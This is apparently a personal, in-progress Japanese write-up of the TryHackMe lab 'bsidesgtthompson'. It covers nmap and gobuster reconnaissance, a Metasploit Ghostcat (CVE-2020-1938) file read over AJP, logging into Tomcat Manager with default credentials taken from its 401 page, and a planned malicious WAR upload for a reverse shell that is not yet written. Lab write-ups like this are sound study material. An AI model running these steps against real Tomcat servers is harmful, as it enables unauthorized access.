---
tags: [hacking, box, writeup]
platform: TryHackMe
difficulty: Easy
status: in-progress
date: 2026-03-27
skills:
  - Ghostcat (CVE-2020-1938)
  - AJP13
  - Apache Tomcat
  - Tomcat Manager
---

# bsidesgtthompson

**プラットフォーム**: TryHackMe
**難易度**: Easy
**OS**: Linux

---

## 情報収集

### Nmap

```bash
nmap -sC -sV -T4 <TARGET_IP>
```

**開いているポート:**
| ポート | サービス | バージョン |
|-------|---------|----------|
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 8009/tcp | AJP13 | Apache Jserv Protocol v1.3 |
| 8080/tcp | HTTP | Apache Tomcat 8.5.5 |

### ディレクトリ列挙

```bash
gobuster dir -u http://<TARGET_IP>:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**発見したパス:**
| パス | ステータス |
|------|---------|
| `/docs` | 302 |
| `/examples` | 302 |
| `/manager` | 302 |

---

## 脆弱性発見

### Ghostcat (CVE-2020-1938)

AJP13 (8009) が外部公開されている。

- Apache Tomcat 8.5.5 は脆弱なバージョン（修正版: 8.5.51+）
- 認証なしで Tomcat アプリ内の任意のファイルを読み取り可能
- `WEB-INF/web.xml` 等の設定ファイルから認証情報取得の可能性

```bash
# Metasploit で実行
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS <TARGET_IP>
set RPORT 8009
run
```

**結果**: `web.xml` 取得成功 → ただし認証情報なし（デフォルトTomcatページ）

### AJP (Apache JServ Protocol) とは

```
[ブラウザ] --HTTP--> [Apache httpd] --AJP--> [Tomcat]
```

WebサーバーとJavaアプリケーションサーバー間の内部通信プロトコル。
設定ミスで `0.0.0.0` にバインドされると外部から直接アクセス可能になる。

### Tomcat Manager 認証情報

401エラーページにデフォルト認証情報のヒントが記載されていた。

```
GET /manager/html → 401 Unauthorized
ページ内に記載: username="tomcat" password="s3cret"
```

```bash
curl -u "tomcat:s3cret" http://<TARGET_IP>:8080/manager/html
# → 200 OK ログイン成功！
```

**取得した認証情報**: `tomcat:s3cret`

---

## 侵入 / Initial Access

### 方針: Tomcat Manager から WAR ファイルアップロード → RCE

Tomcat Manager にログイン成功したため、悪意のある `.war` ファイルをデプロイしてリバースシェルを取得する。

> ※ 作業中

---

## 権限昇格 / Privilege Escalation

> ※ 未着手

---

## 習得スキル・学び

- AJP13プロトコルの役割と危険性
- Ghostcat (CVE-2020-1938) の仕組みと限界（アプリ内ファイルのみ読み取り可能）
- Tomcat Manager の 401 エラーページにデフォルト認証情報のヒントが含まれる場合がある
- Tomcat Manager へのアクセスは WAR デプロイによる RCE に直結する

## ハマったポイント

- Ghostcatで `tomcat-users.xml` を取得しようとしたが WEB-INF 外のため失敗
- Metasploit の `tomcat_mgr_login` でブルートフォースするも `tomcat:s3cret` が未ヒット → 401ページを手動確認してヒントを発見

## 参考にしたリソース

-
